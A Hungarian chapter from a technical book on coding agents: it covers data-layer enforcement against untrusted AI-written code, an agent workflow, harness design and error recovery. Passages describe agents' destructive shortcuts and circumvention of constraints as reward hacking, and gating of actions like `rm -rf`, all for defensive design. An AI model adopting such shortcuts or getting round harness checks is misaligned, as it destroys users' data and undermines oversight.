[^ch5-1]: A lojalitási spektrum és magatartási kódex teljes kiértékelése megtalálható: Li, Bojie és Noah Shi. *Whose Side Is Your Agent On? Multi-Party Principal Loyalty in LLM Agents.* arXiv:2606.30383, 2026.

**Amikor az AI-Írt Kód Maga Sem Megbízható: A Bizalmi Határ Lefelé Tolása.**

A fenti lojalitási kódex "növeli a valószínűségét", hogy az Ágens betartja a szabályokat, de magas kockázatú adatműveleteknél a "nagyobb valószínűség" nem elég — a korlátozásoknak el kell mozdulniuk "reméljük, az Ágens jól viselkedik" állapotból az adatrétegben történő kényszerítés felé. A radikálisabb álláspont[^ch5-2]: **egyszerűen kezeljük az alkalmazási réteget megbízhatatlanként, és az adatinvarjánsok kényszerítését toljuk le alá**. Az elmúlt harminc évben a szoftver integritási határa az "alkalmazási rétegben" volt — a kezelőkód határozta meg, hogy ki végezhet egy adott műveletet, és mely értékek érvényesek, az adatbázis pedig feltétel nélkül megbízott abban a kódban; de az LLM által generált kezelők gyakran kihagyják azokat a jogosultsági és integritási ellenőrzéseket, amelyeket az emberi szerzők természetes módon beépítenének, és az autonóm Ágensek közvetlenül termelési adatokon működnek, megtörve ezt az előfeltevést. Az új megközelítés (amit Jogosultságba Ágyazott Adat Objektumoknak nevezhetünk) esetén minden adatentitás egy "ember által felülvizsgált sémán" belül hordozza a deklaratív jogosultsági szabályokat, validátorokat és következménynyilatkozatokat, amelyeket egy futásidejű csővezeték érvényesít "minden egyes íráskor". A kulcsfontosságú primitív a "hozzáférési kontextus", amely minden művelethez csatolva van: egy újragenerált kezelő annak a felhasználónak a jogosultságaival fut, akit szolgál, míg egy autonóm Ágens a saját korlátozott identitása (scope-d principal) alatt fut — ahelyett, hogy csak remélnénk, hogy az Ágens lojális marad, az architektúra korlátozott principálisként kezeli, így még ha kompromittálódik is, nem lépheti túl a jogosultságait.

Azonos promptkészlettel végzett összehasonlításokban ez a mechanizmus **nulla olyan írást produkált, amely megsértette a deklarált invaránsokat**, míg a puszta SQL, az LLM által írt ellenőrzések, az alkotmányos promptok és az akcióhatár-megszakítók mind egy maroknyitól több tucatnyi megsértésig engedtek át. Nem "nagyobb valószínűséggel helyes", hanem "lehetetlen rossznak lenni", körülbelül 2 extra ezredmásodperc írásenként. Természetesen a garancia feltételes: a sémának valóban rögzítenie kell az összes kívánt invaránst, és a telepítésnek blokkolnia kell minden olyan útvonalat, amelyen a megbízhatatlan réteg megkerülhetné a tárolót és közvetlenül az adatbázishoz csatlakozhat. Kódoló Ágensek számára ez egy fontos architekturális elvet eredményez: **amikor a kódíró és a kódfuttató is lehet megbízhatatlan, a valóban megbízható korlátozások nem élhetnek a generált kódban, hanem az alatta lévő, ember által felülvizsgált alapba kell kerülniük** — ez az 1. fejezet "korlátozások az iránymutatás felett" elvének végső formája az adatrétegben.

[^ch5-2]: Ennek a "bizalmi határ alkalmazási réteg alá tolásának" tervezése és kiértékelése (beleértve a megsértések számának teljes összehasonlítását a különböző megoldások között) megtalálható: Li, Bojie. *The Application Layer Is No Longer Trusted: Enforcing Data Invariants Below AI-Written Code and AI Agents.* 2026 (megjelenés alatt).

### A Kódoló Ágens Teljes Munkafolyamata


![5-2. ábra: Kódoló ágens munkafolyamata](images/fig5-2.svg)


Az alábbiakban egy "ajánlott mérnöki munkafolyamatot" írunk le. Ez a szoftvermérnöki legjobb gyakorlatok idealizált alkalmazását mutatja be Kódoló Ágensekre. A valós Kódoló Ágensek (mint a Claude Code, OpenClaw) gyakrabban egy reaktív, iteratív ciklusban dolgoznak, és "szükség szerint rövidítik ezt a munkafolyamatot" — egyszerű feladatoknál kihagyják a tervezési dokumentumot, és nem várnak blokkolóan a felhasználói jóváhagyásra minden lépésnél; csak amikor egy feladat összetett és messzemenő következményekkel jár, akkor futtatnak minden fázist teljes egészében.

A különböző modellek eltérően rövidítik le ezt a munkafolyamatot. Egyes Coding modellek az első szerkesztés előtt széles körben átolvassák a tároló szerkezetét, a megvalósítást, a hívási helyeket és a teszteket. Mások csak néhány, várhatóan releváns fájlt vizsgálnak meg, korán elkészítenek egy javítást, majd a fordító és a tesztek visszajelzését is a felderítés részének tekintik. Az információgyűjtés befejezésének és a cselekvés megkezdésének küszöbe a Harness cseréje után is követheti a modellt, és megváltozhat, ha ugyanabban a Harnessben csak a modellt cseréljük le. Ez tehát elsősorban **a modell által megtanult viselkedés**, nem pusztán egy Coding termék felületi stílusa. A Harness promptjai, eszközei és költségkerete erősíthetik vagy gyengíthetik ezt a hajlamot, de nem szükségszerűen ők a forrásai. A 6-7. kísérlet rögzített Harnessben méri ezt a különbséget; a 7. fejezet pedig bemutatja, hogyan írhatja a post-training az ilyen policyt a paraméterekbe.

"Projekt Dokumentáció."

Egy Kódoló Ágens munkája a projekt szisztematikus megértésével kezdődik. Amikor egy Ágens először találkozik egy kódrepóval, az első feladata nem a kód módosításának megkezdése, hanem a teljes projektre vonatkozó kognitív keretrendszer felépítése — akárcsak egy új mérnök, aki nem az első napon pushol kódot, hanem a terep megismerésével kezdi. Az Ágens először ellenőrzi, hogy a projekt rendelkezik-e dokumentációval — README-vel, architektúra tervezési dokumentumokkal, fejlesztői útmutatókkal.

Ha a kulcsfontosságú dokumentumok hiányoznak, az Ágens ne kezdjen el vakon dolgozni. Szisztematikusan át kell vizsgálnia a kódbázist, azonosítania a fő modulokat, a mag-absztrakciókat és a komponensfüggőségeket, és el kell készítenie egy architektúra áttekintést, könyvtár-útmutatót és utasításokat a tesztek futtatásához. Ezek a dokumentumok tervrajzként szolgálnak az Ágens későbbi munkájához, és belépési pontot biztosítanak más fejlesztők számára. Ez egy kulcsfontosságú elvet testesít meg: a tudás externalizációja a hatékony együttműködés előfeltétele.

A projekt dokumentációnak ma már van egy Ágensek számára specifikus formája: "Projekt Utasítás Fájlok". Az olyan fájlok, mint a CLAUDE.md, AGENTS.md, .cursorrules iparági szabvánnyá váltak — automatikusan beinjektálódnak a kontextusba minden kapcsolat elején, projektszintű rendszer promptként működve. Az emberi olvasóknak szánt README-ktől eltérően az utasításfájlok Ágensekre vonatkozó viselkedési konvenciókat hordoznak: build és teszt parancsok ("használd a `pnpm test`-et a `npm test` helyett"), kódstílus ("kerüld az `any` típust"), és egyértelmű korlátozott zónák ("ne módosítsd a `migrations/` könyvtárat"). Ez ugyanaz az ötlet, mint az OpenClaw `SOUL.md` fájlja (amely az Ágens identitását és viselkedési szabályait definiálja) és `MEMORY.md` fájlja (amely a kapcsolatokon átívelő tapasztalatokat halmozza fel), csak eltérő szinten alkalmazva: a SOUL.md azt határozza meg, hogy "ki az Ágens," míg a projekt utasításfájlok azt határozzák meg, hogy "hogyan kell dolgozni ebben a projektben." A 2. fejezet kontextusmérnökségének szempontjából az utasításfájlok a leggazdaságosabb stabil előtagok is — tartalmuk nem változik a feladattal, így természetesen KV Cache-barátok; ezek a "tudásnak magában a kódbázisban kell léteznie" elv legközvetlenebb implementációi is.

A tudás externalizációjának elvének van egy érdekes következménye is: **Azok a csapatok, amelyek barátságosak a távoli munkához, általában barátságosak az AI Ágensekhez is.** A távoli csapatok kénytelenek aszinkron kommunikációra és dokumentációra támaszkodni — a döntések dokumentumokba kerülnek rögzítésre, a kontextus issue és PR leírásokban él, a törzsi tudás fejlesztői útmutatókban halmozódik fel, nem a szomszéd asztalnál vagy egy tárgyaló tábláján szájról szájra terjed. Ez pontosan az a tudásforma, amelyet az Ágensek fel tudnak dolgozni: egy Ágens nem tud elolvasni egy szóbeli megállapodást, de el tud olvasni egy tervezési dokumentumot. Ezzel szemben egy olyan csapat, amely a "csak kérdezd meg a mellettem ülőt" elven működik, ugyanazt a meredek beilleszkedési költséget rója az Ágensre, mint egy új távoli kollégára. Egy egyszerű mérőszám arra, hogy egy csapat mennyire "AI-kész": tud-e egy távoli újonc önállóan dolgozni, csak a kódrepóra és annak dokumentációjára támaszkodva?

"Feladat Megértése és Követelménytisztázás."

Az egyszerű, egyértelmű határokkal és korlátozott hatással bíró követelmények esetén — mint egy ismert hiba javítása vagy egy függvény paramétereinek módosítása — az Ágens közvetlenül folytathatja a megvalósítási fázist. A szoftverfejlesztés legtöbb feladata azonban nem ilyen egyszerű.

Az összetett követelményekhez az Ágensnek óvatosabbnak és módszeresebbnek kell lennie. Az összetettség több dimenzióból fakadhat: a követelmény kétértelműsége (a felhasználó tudja, mit akar, de nem tudja pontosan kifejezni), a megvalósítási utak sokfélesége (több technikai megoldás, saját kompromisszumokkal), vagy a hatás szélessége (több modul módosítását igényli, potenciálisan megtörve a meglévő funkcionalitást). Az Ágensnek felderítő kutatáson keresztül kell tisztáznia a határokat, és szükség esetén proaktívan párbeszédet kell kezdeményeznie a felhasználóval. Például amikor egy felhasználó "optimalizáld a rendszer teljesítményét" kéréssel fordul az Ágenshez, annak először meg kell határoznia a konkrét célt (válaszidő csökkentése, memóriahasználat csökkentése vagy áteresztőképesség növelése), hogy mely kompromisszumok elfogadhatóak (pl. elfogadható-e a megnövekedett kódkomplexitás), és hol van az aktuális szűk keresztmetszet. A homályos követelményekkel történő kódolás gyakran jelentős átdolgozáshoz vezet.

"Tervezési Dokumentum Írása."

A tervezési dokumentum egy híd, amely az absztrakt követelményeket konkrét megvalósítási tervvé fordítja. Négy alapvető kérdésre kell választ adnia: mely modulokat kell módosítani és miért, mely megközelítést kell választani és milyen kompromisszumokkal jár, milyen új függőségekre van szükség, és milyen hatással várhatóak a változtatások a rendszerre. A tervezési dokumentum írása maga is mély gondolkodás — arra kényszeríti az Ágenst, hogy fogalmilag érvényesítse egy megoldás megvalósíthatóságát, mielőtt nagy erőfeszítést fektetne a kódolásba. Még fontosabb, hogy a tervezési dokumentum hatékony beavatkozási pontot biztosít az emberek számára — egy tömör tervezési dokumentum áttekintése sokkal könnyebb, mint több száz sornyi kód átnézése. A tervezési dokumentum elkészítése után az Ágensnek be kell nyújtania azt felhasználói felülvizsgálatra, és meg kell várnia a jóváhagyást a továbblépés előtt.

"Kód Megvalósítás és Tesztelés."

A tervezés jóváhagyása után az Ágens a projekt kódolási konvencióit követve végzi a megvalósítást, újrahasználja a meglévő absztrakciókat és eszközöket, és szükség esetén mérsékelt refaktorálást végez a kódbázis egészségének megőrzésére.

A megvalósítás után az Ágens azonnal egy tesztvezérelt minőségbiztosítási fázisba lép — teszteseteket ír az új vagy módosított funkcionalitáshoz, lefedve a normál útvonalakat, határfeltételeket és hibafeltételeket. A tesztek megírása után az Ágens végrehajtja a tesztcsomagot. Ha a tesztek sikertelenek, az Ágens ne egyszerűen jelentse a hibát a felhasználónak, hanem elemezze az okot, lokálizálja a problémát, és módosítsa a kódot, amíg az összes teszt át nem megy. Ez a "teszt-javítás" ciklus több iterációt igényelhet, és ez az önjavító képesség emeli a Kódoló Ágenst a kódgenerátorból megbízható mérnöki asszisztenssé. Ezzel szemben a Kódoló Ágensek leggyakoribb lazasága ennek a fázisnak a teljes kihagyása — a kód megírása és a "feladat kész" jelentés anélkül, hogy valaha is lefuttatták volna a teszteket. A "tesztek átmennek," nem a "kód megírva" definiálása a teljesítési kritériumként pontosan a Loop Engineering azon elve, hogy a verifikáció döntse el, mikor biztonságos megállni, a kódolásra alkalmazva (a 10. fejezet szisztematikusan tárgyalja a "korai befejezés" ezen osztályát).

Még ha minden teszt át is megy, az Ágens munkája még nem ért véget. A következő fázis a kód áttekintés: az Ágens kritikusan megvizsgálja a saját generált kódját. Olvasható és megfelelően kommentált? Vannak-e lappangó teljesítményproblémák vagy biztonsági rések? Követi-e a projekt kódstílusát és legjobb gyakorlatait? Ez az önfelülvizsgálat történhet a kód olvasásával, lint eszközök futtatásával, vagy egy dedikált kódáttekintő szubágens meghívásával. Ha az áttekintés problémákat talál, az Ágensnek vissza kell térnie a módosítási fázishoz és ki kell javítania azokat, ahelyett, hogy hibás kódot szállítana a felhasználónak.

"Dokumentáció Szinkronizálás és Leadás."

Ha a kódváltoztatások architekturális változásokkal járnak — például új modul bevezetése, modulok közötti függőségek megváltozása, vagy mag-absztrakciók szemantikájának megváltozása — az Ágensnek frissítenie kell az architektúra dokumentációt. Az elavult dokumentáció rosszabb, mint a dokumentáció hiánya, mert félrevezeti a jövőbeli fejlesztőket. Azzal, hogy az Ágens minden jelentős változtatás után automatikusan frissíti a dokumentációt, segít megőrizni a projekt tudásbázisának integritását és időszerűségét.

Ez a munkafolyamat a szoftvermérnökség alapelveit testesíti meg: a tervezés megelőzi a cselekvést, a verifikáció áthat mindent, és a dokumentáció a kóddal együtt fejlődik.

### Harness Mérnökség a Gyakorlatban Kódoló Ágensek Számára

Az 1. fejezet bevezette a Harness Mérnökség koncepcióját és az **Ágens = Modell + Harness** formulát. A Harness itt magában foglalja a kontextust és az eszközöket a központi formulából, valamint a korlátozásokat, a verifikációt és a korrekciós mechanizmusokat — ez az öt elem együtt alkotja az 1. fejezetben definiált Harness-t. A Kódoló Ágensek talán az a terület, ahol a Harness Mérnökség a legjobban megtérül — a kódírás a "leginkább verifikálható" az összes Ágens feladat közül, és korlátozásai, verifikációja és korrekciója mind támaszkodhatnak a meglévő infrastruktúrára. Ez a szakasz a konkrét gyakorlatra összpontosít a Kódoló Ágens forgatókönyvben.

Az, hogy egy rendszer stabilan működik-e, gyakran kevésbé függ a modell erejétől, mint inkább az Ágens köré épített infrastruktúra robusztusságától. Az 1. fejezet a Harness-t két rétegre osztja — "Kontextus és Eszközök" (lehetővé teszik az Ágens számára a cselekvést) és "Korlátozások, Verifikáció és Korrekció" (segítenek az Ágensnek biztonságosan és helyesen cselekedni). A Kódoló Ágens forgatókönyvben ezek specifikus mérnöki komponensekké alakulnak:

- "Elfogadási Alapvonal": Mi számít "kész"-nek — tesztcsomagok, CI csővezeték (Continuous Integration csővezeték, a kód beküldése után automatikusan lefutó ellenőrzések sorozata), kódáttekintési standardok
- "Végrehajtási Határ": Mit érinthet és mit nem az Ágens — modulhatárok, függőségi szabályok, jogosultsági vezérlők
- "Visszajelzési Jelek": Automatizált helyességítéletek — Linter (kódstílus-ellenőrző eszköz, amely automatikusan képes formázási hibákat és potenciális problémákat találni) kimenet, teszteredmények, típusellenőrzési hibák
- "Visszaállítási Mechanizmus": Hogyan lehet helyreállni, ha valami rosszul sül el — Git verziókezelés, sandbox izoláció, pillanatkép-visszaállítás

**Miért Különösen Alkalmasak a Kódoló Ágensek a Harness Mérnökségre.**

Két dimenzió — a cél egyértelműsége és a verifikáció automatizáltsága — négy állapotra osztja a feladatokat. Az egyértelmű cél automatikusan verifikálható eredményekkel az a terület, ahol az Ágensek virágoznak; az egyértelmű cél, amelynek elfogadása még mindig emberi szemfüggőséget igényel, az emberi felülvizsgálat sebességére korlátozza az áteresztőképességet; az automatikus visszajelzés homályos céllal lehetővé teszi, hogy a rendszer hatékonyan menjen rossz irányba; mindkettő hiányában az Ágens kevés hasznot hoz. Az 5-1. táblázat ezt a négy állapotot mutatja. A Harness célja, hogy minél több feladatot az "egyértelmű cél + automatikus verifikáció" négyesbe toljon.

5-1. táblázat: A feladat egyértelműségének és a verifikáció automatizáltságának négy négyzete

| | Eredmények automatikusan verifikálhatók | Eredmények manuális verifikációt igényelnek |
|---------|--------------------------------------------|------------------------------------------|
| "Egyértelmű cél" | Édes pont: hibajavítás tesztesetekkel | Áteresztőképesség-korlátos: kód refaktorálás manuális felülvizsgálatot igényel |
| "Homályos cél" | Hatékonyan rossz irányba: "kódminőség" optimalizálása linterrel | Nehéz elindulni: "tedd szebbé a UI-t" |

A kódírási feladatok természetesen az "egyértelmű cél + automatikus verifikáció" négyesben helyezkednek el — a tesztcsomagok egyértelmű elfogadási kritériumokat biztosítanak, a linterek és típusellenőrzők azonnali automatikus verifikációt kínálnak, a Git pedig tökéletes verziókezelést és visszaállítási képességeket. Ez magyarázza, hogy a Kódoló Ágensek miért a legérettebbek az összes Ágens típus közül: nem azért, mert a kódgeneráló modellek különösen erősek, hanem mert a szoftvermérnökség évtizedes infrastruktúrája természetes módon alkot egy robusztus Harness-t.

"Iparági Gyakorlat."

A Harness gyakorlat három esettanulmánya megerősíti a fenti elveket:

- "Nagyléptékű kód migrációs eset" (egy nagy tech vállalat nyilvánosan megosztott nagyléptékű kód migrációs gyakorlatából): A kulcs nem a modell ereje volt, hanem hogy a Harness három dolgot csinált jól — a tudásnak magában a kódbázisban kell léteznie (amit az Ágens nem lát, az nem létezik), a korlátozások a linterekbe és CI-be vannak kódolva, nem dokumentációba írva, és a verifikáció és korrekció teljesen automatizált, végponttól végpontig.
- "LangChain": Jelentősen javította a benchmark feladatok teljesítményét pusztán a Harness optimalizálásával (rendszer promptok, eszköz middleware, önellenőrző ciklusok). Különösen figyelemre méltó a "hiba trajektóriák elemzése Ágens segítségével a Harness javításához" módszertana, amely a Harness mérnökséget tapasztalatvezéreltből adatvezéreltté alakítja.
- "Anthropic": A hosszú feladatokat két szerepre bontja — egy inicializációs Ágensre, amely a nagy feladatot feladatok listájára bontja, és egy végrehajtási Ágensre, amely lépésről lépésre halad előre, a köztes eredményeket (mint a befejezett kódfájlok és a frissített feladatlista) a következő kör számára hagyva. Ez a munkamegosztás megoldja a hosszan futó Ágensek azon problémáját, hogy "túl sokat akarnak egyszerre csinálni" vagy "idő előtt befejezettnek nyilvánítják magukat."

**A Kódoló Ágenstől az Általános Harness Tervezési Elvekig.**

A Kódoló Ágensek Harness gyakorlatai átvihető tervezési elveket biztosítanak minden Ágens rendszer számára:

1. "Korlátozások az iránymutatás felett": A szabályokat, amelyek kóddal kényszeríthetők ki, kódban kell rögzíteni, nem csupán javasolni a dokumentációban. A linter szabályok, típuskorlátozások és CI ellenőrzések értéke messze meghaladja a "kérem, kövesse..." iránymutatást a rendszer promptokban — az előbbi azt jelenti, hogy "nem lehet megcsinálni," az utóbbi csupán "nem ajánlott."
2. "Automatizáld a verifikációt": A manuális felülvizsgálat egy nem skálázható szűk keresztmetszet. A tesztcsomagokba, kódminőség-ellenőrzésekbe és viselkedésfigyelésbe fektetett erőfeszítés sokkal nagyobb hozamot ad, mint a további emberi erőfeszítés hozzáadása.
3. **A visszajelzés legyen olyan gyors és strukturált, amennyire csak lehetséges**: Minél részletesebb a hibaüzenet és minél közelebb van a hiba pillanatához, annál hatékonyabban tudja az Ágens kijavítani magát. A 2. fejezet Ágens állapotsáv technikái (részletes hibaüzenetek, eszközhívás számlálók) ezt az elvet testesítik meg.
4. "A visszaállításnak megbízhatónak kell lennie": Az Ágensek csak akkor tudnak bátran kísérletezni, ha egy biztonsági hálón belül működnek. A Git branch-ek, sandbox környezetek és pillanatkép mechanizmusok biztosítják, hogy minden hiba visszafordítható legyen.

**A korlátozások mélyebb célja: folyamatbeli hibák megelőzése.** Az elfogadási alapvonal azt szabályozza, hogy az eredmény helyes-e; a végrehajtási határ a "folyamatot" szabályozza — még a helyes eredmény sem igazolja a rossz módszert. Az adatbázis törlése és újraépítése egy adatbázis-hiba "kijavításához" valóban helyrehozza azt, de az adatok elvesznek; az összes kód törlése egy fordítási hiba javításához valóban átmegy a fordításon, de az implementáció eltűnik. Az ilyen destruktív gyorsítópályák mindig léteznek: még ha a korlátozások be is vannak írva a végső kiértékelési metrikákba, az Ágensek gyakran találnak módot a megkerülésükre — ez a reward hacking (7. fejezet) mindennapi formája az Ágens feladatokban. Egy production Harness ezért dedikált ellenőrzéseket és jóváhagyásokat helyez a veszélyes akciókra, mint az `rm -rf`, a termelési adatok törlése, vagy egy olvasatlan fájl felülírása (szemantikai elemzés e fejezet biztonsági szakaszában, Sidecar felülvizsgálat a 4. fejezetben), korlátozva az "akciókat", nem csak az eredményeket. A 7. fejezet RLVP-je (Reinforcement Learning with Verified Penalty — "jutalmazd az eredményt, büntesd az utat") ugyanerre a kérdésre ad választ a tréning oldaláról: a végső eredmény jutalmán túl a verifikálható megsértéseket bünteti az út során, internalizálva a "nincs destruktív eszköz" elvet a modell mérnöki józan eszeként. Egy meglévő modellnél a Harness korlátjai külső korlátozások; egy betanítható modellnél a folyamat büntetések internalizálják ugyanazokat a korlátozásokat. A cél ugyanaz.

"Eszköz Orchesztáció: Hiba Határ Szabályozás." Az érett Kódoló Ágensek támogatják a párhuzamos eszközhívásokat. A Harness szempontjából egyedi probléma "a hibák terjedése": amikor egy eszköz meghibásodik, mely hívásokat kell megszakítani és melyeket folytatni? Az elv az, hogy a hibák csak ugyanazon párhuzamos hívás kötegén belül terjednek, nem felfelé a szülő művelethez. Amikor három fájlt olvasunk párhuzamosan, például egy hiányzó fájlnak csak azt az egy hívást szabad meghiúsítania; nem szabad törölnie a másik kettőt, sem az egész feladatot megszakítania. Ez a finom szemcséjű hiba határ szabályozás elkerüli a "egy parancs hiba az egész feladatot megszakítja" törékeny mintát. A párhuzamos hívások, streaming feldolgozás és lépcsőzetes megszakítások konkrét mechanizmusai e fejezet "Implementációs Tippek" szakaszában találhatók.

### Hibák és Hibahelyreállítás

Az előző szakasz a Harness mérnökség alapelveit és összetevőit mutatta be; ez a szakasz abba a részbe merül bele, amely a leginkább megkülönbözteti a mérnöki érettséget — a "hibák és hibahelyreállítás". Az 1. fejezet ablációs kísérlete megmutatta, mennyire súlyos lehet a probléma: egyetlen eszközeredmény hiánya is elegendő ahhoz, hogy az Ágens egy végtelen ciklusba ragadjon — és a valós termelési környezetek sokkal sokszínűbb hibákat produkálnak, mint bármely kísérlet. Ez a szakasz szisztematikusan három kérdésre válaszol: Milyen hibákkal találkozik egy production Harness? Hogyan érzékeli és hogyan állítja helyre őket? És mikor kell a rendszernek megszakítania a működést?[^ch5-3]

[^ch5-3]: Az ebben a szakaszban található hibatipológia és mechanizmus elemzés a production-grade Ágens implementációk, mint a Claude Code, forráskódjának kutatásán alapul. A konkrét implementációk gyorsan fejlődnek a verziók között; ez a szakasz csak a stabil mérnöki alapelveket desztillálja.

"A hibák tipológiája: négy réteg." A szisztematikus válasz első lépése az osztályozás. A hibák négy rétegbe sorolhatók aszerint, hogy hol következnek be:

- "API réteg": sebességkorlátozás (HTTP 429), szolgáltatás túlterhelés, kérések időtúllépése, kapcsolat megszakadás, és a token határ miatti csonkolt kimenet. Ezek a hibák nem kapcsolódnak magához a feladathoz — infrastrukturális zajok.
- "Eszköz réteg": hallucinált hívások (nem létező eszköz meghívása), hibás argumentumok (az eszköz bemeneti szerződésének megsértése), végrehajtási kivételek, és a legveszélyesebb fajta — egy eszköz ismételten ugyanazt a hibát adja vissza, miközben a modell változatlanul újrapróbálkozik.
- "Kontextus réteg": kontextusablak túlcsordulás, tömörítési hiba, és sérült trajektória struktúra (mint egy eszközhívás, amelyből hiányzik a párosított eredmény üzenet).
- "Vezérlésfolyam réteg": végtelen ciklusok (ugyanazon művelet ismétlése haladás nélkül) és halálspirálok (a hibából indított helyreállítási logika maga hívja az LLM-et, újra hibázik, és lépcsőzetesen terjed).

"Érzékelés: először osztályozz, aztán számolj." Amikor egy hiba bekövetkezik, az első kérdés nem az, hogy "Próbáljuk újra?" hanem hogy "Segítene az újrapróbálkozás?" Az újrapróbálkozható hibák (sebességkorlátozás, túlterhelés, hálózati ingadozás) megérdemlik az újrapróbálkozást; a nem újrapróbálkozható hibák (érvénytelen argumentumok, elégtelen jogosultságok, nem létező eszköz) ugyanazt az eredményt adják, akárhányszor próbáljuk újra — a bemenetnek vagy a stratégiának kell változnia. Egy production Harness fenntart egy leképezést a hibatípusokról a helyreállítási stratégiákra, nem pedig egy általános "hiba esetén próbáld újra" szabályt.

Az egyedi hibákon túl érzékeljük a "mintákat". Először, ismételt hívás ujjlenyomatok: hash-eljük az "eszköznév + argumentumok" párost; ugyanazon ujjlenyomat ismétlődése egyértelmű jele a haladás nélküli ciklusnak — az 1. fejezet ablációs kísérletében az Ágens, amely ugyanazt az eszközt hívta újra és újra, pontosan ezt a mintát követte. Másodszor, egymást követő hibaszámlálók: minden helyreállítási útvonal saját számlálót tart fenn, alapot adva a később tárgyalt megszakítóknak.

A hibák harmadik osztálya egyáltalán nem hibaként jelenik meg, és dedikált "életjel- és integritásfigyelést" igényel. A streaming kapcsolat legveszélyesebb meghibásodási módja nem a megszakadás (amely azonnal hibát produkál), hanem a néma leállás — a kapcsolat továbbra is fennáll, de az adatáramlás megszűnik, mint egy csatlakoztatott cső, amely nem ad vizet. Az SDK időtúllépések gyakran csak a kezdeti kapcsolatot fedik le, nem az átviteli folyamatot, ezért egy production Ágensnek szüksége van egy független tétlen őrszemre (egy watchdog időzítő — ha nem érkezik új kimenet egy beállított intervallumon belül, a kapcsolat leálltnak minősül), amely a beakadt streamet megöli és időtúllépéskor újrapróbálkozást indít. Ez egy általános elvvé általánosítható: **minden hosszú életű kapcsolatnak szüksége van egy életjelre, nem csak egy kapcsolati időtúllépésre.** Az integritásfigyelés a trajektória struktúrára irányul: amikor egy eszközhívásból hiányzik a párosított eredmény üzenet, a rendszer helyreállítja a párosítást, mielőtt a kontextusba injektálná, ahelyett, hogy a strukturális anomáliát a modellre vagy a felhasználóra zúdítaná. Egy figyelemre méltó mérnöki részlet: néhány production Ágens egyszerre futtat production módot és tréning adatgyűjtő módot — a production mód helyettesítőkkel javíthatja a hiányzó üzeneteket, míg a tréning mód megtagadja a javítást, mert a szintetikus helyettesítők szennyeznék a tréning adatokat. Ez a "megengedő productionban, szigorú tréningben" kettős standard a Harness és a modelltréning közötti mély kapcsolatot tükrözi.

**Helyreállítás: eszkaláció egyre láthatóbb szinteken keresztül.** A helyreállítási intézkedések osztályozása attól függően történik, hogy mennyire láthatók a felhasználó számára; ha egy alacsonyabb szint megoldja a problémát, ne eszkalálj:

1. "Csendes újrapróbálkozás". Az alapértelmezett akció az újrapróbálkozható hibákra. Két részlet határozza meg, hogy az újrapróbálkozások sikeresek-e: először, használj exponenciális visszavárást véletlenszerű ingadozással, hogy megakadályozd a kliensek flottáinak szinkronizált újrapróbálkozását és a másodlagos torlódást, miközben tartsd tiszteletben a szerver által javasolt várakozási időtartamot; másodszor, különböztesd meg az előtér és a háttér hívásokat — a meghiúsult főciklus kérést újrapróbáljuk, de a segéd-háttérhívásokat (címgenerálás, beviteli javaslatok) hiba esetén eldobjuk, nehogy a háttér újrapróbálkozások kiszorítsák a főciklus kvótáját és "újrapróbálkozás erősítést" hozzanak létre.
2. "Fokozatcsökkentés és folytatás". Amikor az újrapróbálkozások sikertelenek, magát a kérést változtassuk meg és próbáljuk újra. Vegyük a kimenet csonkítást (a generálás a hosszkorlát miatt megszakad): először csendesen küldjük újra magasabb kimeneti korláttal; ha az még mindig nem elég, fűzzünk egy meta-utasítást az üzenet végére, hogy a modell folytassa a generálást a megszakítási ponttól. Amikor az elsődleges modell tartósan túlterhelt, váltsunk vissza egy másik modellre, először eltávolítva a korábbi modell saját formázási blokkjait az előzményekből, hogy az új modell elemezni tudja azt; amikor egy magas költségű mód sebességkorlátozott, ideiglenesen váltsunk vissza a standard módra.
3. "Megjelenítés a felhasználónak". Csak miután minden automatikus eszköz kimerült, a hiba bemutatásra kerül — a már megkísérelt helyreállítási akciókkal együtt.

Az eszközréteg hibák eltérő utat követnek: **ne szakítsuk meg a kapcsolatot; alakítsuk a hibát a modell bemenetévé**. Egy hallucinált hívás strukturált "nincs ilyen eszköz" hiba eredményt kap; egy validációs hiba a bemeneti szerződésre utaló tippekkel ellátott hibát kap; a hibás argumentumok (string, ahol objektum volt várható) programozottan javításra kerülnek a végrehajtás előtt. Ezek a hibák szokásos eszközeredményként kerülnek a kontextusba, és a modell a következő lépésben kijavítja magát — az alkalmazása a korábbi elvnek, hogy "minél strukturáltabb a visszajelzés, annál jobb": minél specifikusabb a visszajelzett hiba, annál magasabb a modell önkorrekciós aránya.

A szakasz központi elve: **a hiba kezelésének egysége nem az egyedi kérés, hanem a teljes helyreállítási hurok**. Amíg a helyreállítás nem bizonyul lehetetlennek, a köztes hibákat nem szabad elérhetővé tenni a fogyasztók számára — legyen az a felhasználó vagy az eseményekre feliratkozott downstream rendszerek: tartsd vissza a hibaüzeneteket a helyreállítás során; ha a helyreállítás sikeres, a fogyasztók soha nem veszik észre; csak amikor minden elbukik, a visszatartott hibák felszabadításra kerülnek. Ez az 1. fejezet korrekciós elvének mérnöki megvalósítása — "ne tedd elérhetővé a köztes állapotokat, amíg a helyreállítás lehetetlennek nem bizonyul."

**Megszakítás: minden helyreállítási útnak szüksége van egy plafonra.** Maguk a helyreállítási mechanizmusok is meghiúsulhatnak, ezért minden helyreállítási útnak rendelkeznie kell egy explicit újrapróbálkozási plafonnal: a kontextustömörítés feladja több egymást követő hiba után; a jogosultsági osztályozó visszaesik az emberi megkérdezésre ismételt hibák után; a kimenet folytatását legfeljebb rögzített számú alkalommal kíséreljük meg. Honnan származnak a küszöbértékek? Production adatokból, nem találgatásból. Vegyük a Claude Code tömörítési megszakítóját: a "3 egymást követő hiba" küszöb valós kapcsolati statisztikákból származik — egy kapcsolat egyszer több mint háromezerszer hibázott egymás után ezen a helyreállítási útvonalon, és az ilyen hiábavaló újrapróbálkozások önmagukban körülbelül 250 000 API hívást pazaroltak el világszerte naponta; több mint ezer kapcsolat esetében volt 50+ egymást követő hiba sorozat. A három az empirikus inflexiós pont a "a hibák túlnyomó többsége ezelőtt helyreáll" és a "további újrapróbálkozások lényegében reménytelenek" között.

